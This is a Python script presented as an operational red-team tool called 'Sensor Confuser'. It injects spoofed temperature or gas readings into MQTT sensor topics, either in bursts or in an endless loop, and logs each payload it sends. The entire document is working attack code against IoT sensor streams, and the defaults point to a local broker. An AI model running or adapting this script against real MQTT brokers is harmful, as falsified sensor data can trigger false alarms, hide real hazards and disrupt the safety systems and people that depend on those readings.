#!/usr/bin/env python3
"""
Sensor Confuser – Injects spoofed sensor values into MQTT streams and logs events.
Fully operational red-team payload.
"""

import os
import json
import time
import argparse
import paho.mqtt.publish as publish

AGENT_ID = "sensor_confuser"
ALERT_FILE = "webgui/alerts.json"
LOG_FILE = "reports/sensor_confuser.log"
MQTT_BROKER = "127.0.0.1"
MQTT_TOPIC_BASE = "iot/sensors/"

# === Utilities ===
def log(msg):
    print(f"[SENSOR] {msg}")
    os.makedirs("reports", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(f"{time.ctime()} | {msg}\n")

def push_alert():
    os.makedirs("webgui", exist_ok=True)
    with open(ALERT_FILE, "a") as f:
        f.write(json.dumps({
            "agent": AGENT_ID,
            "alert": "Sensor spoof injection running",
            "type": "sensor",
            "timestamp": time.time()
        }) + "\n")

def publish_mqtt(sensor_type, spoof_value):
    topic = MQTT_TOPIC_BASE + sensor_type
    payload = {
        "sensor": sensor_type,
        "unit": "C" if "temp" in sensor_type.lower() else "ppm",
        "value": float(str(spoof_value).replace("C", "").replace("ppm", "")),
        "spoofed": True,
        "timestamp": time.time()
    }
    try:
        publish.single(topic, payload=json.dumps(payload), hostname=MQTT_BROKER)
        log(f"Published to MQTT: {topic} -> {json.dumps(payload)}")
    except Exception as e:
        log(f"[!] MQTT publish failed: {e}")

    # Log for forensic trace
    with open("reports/spoof_payloads.jsonl", "a") as f:
        f.write(json.dumps(payload) + "\n")

# === Main logic ===
def inject_sensor_spoof(sensor_type, spoof_value, burst=1, loop=False, delay=3):
    log(f"Injecting spoofed {sensor_type} = {spoof_value}")
    push_alert()
    for _ in range(burst):
        publish_mqtt(sensor_type, spoof_value)
        time.sleep(1)
    if loop:
        log(f"Entering loop mode every {delay}s...")
        while True:
            publish_mqtt(sensor_type, spoof_value)
            time.sleep(delay)

# === Entry ===
def main():
    parser = argparse.ArgumentParser(description="Sensor Confuser – MQTT spoof injector")
    parser.add_argument("--sensor", default="temperature", help="Sensor type (e.g. temperature, gas)")
    parser.add_argument("--value", default="200", help="Spoofed sensor value (e.g. 200C)")
    parser.add_argument("--burst", type=int, default=1, help="How many spoof messages to send immediately")
    parser.add_argument("--loop", action="store_true", help="Loop continuously")
    parser.add_argument("--delay", type=int, default=3, help="Delay between looped spoof injections")
    args = parser.parse_args()

    inject_sensor_spoof(args.sensor, args.value, burst=args.burst, loop=args.loop, delay=args.delay)

if __name__ == "__main__":
    main()
